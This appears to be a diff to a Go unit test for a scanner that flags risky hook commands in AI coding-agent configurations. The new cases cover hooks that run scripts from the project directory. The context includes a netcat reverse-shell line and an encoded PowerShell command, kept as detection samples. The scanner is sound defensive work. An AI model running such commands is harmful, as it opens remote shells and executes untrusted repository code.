@@ -161,6 +161,14 @@ func TestHookRiskFlags(t *testing.T) {
 		"nc -e /bin/sh 10.0.0.1 4444":                     {flagHookNetworkTool},
 		"/usr/local/bin/spoor hook --agent claude-code":   nil,
 		"powershell -EncodedCommand ZQBjAGgAbwAgAGgAaQA=": {flagHookEncoded},
+		// Mentioning the project directory is not running it.
+		"echo $CLAUDE_PROJECT_DIR >> /tmp/hook.log": nil,
+		"$PWDX/run.sh": nil,
+		`& "$env:CLAUDE_PROJECT_DIR\.claude\hooks\x.ps1"`: {flagHookRunsRepoScript},
+		`"%CLAUDE_PROJECT_DIR%\hooks\x.cmd"`:              {flagHookRunsRepoScript},
+		`node "$GEMINI_PROJECT_DIR/.gemini/hooks/h.js"`:   {flagHookRunsRepoScript},
+		`cd "$CLAUDE_PROJECT_DIR" && ./scripts/lint.sh`:   {flagHookRunsRepoScript},
+		"python3 ${CLAUDE_PROJECT_DIR}/hooks/a.py":        {flagHookRunsRepoScript},
 	}
 	for cmd, want := range cases {
 		got := hookRiskFlags(cmd, false)
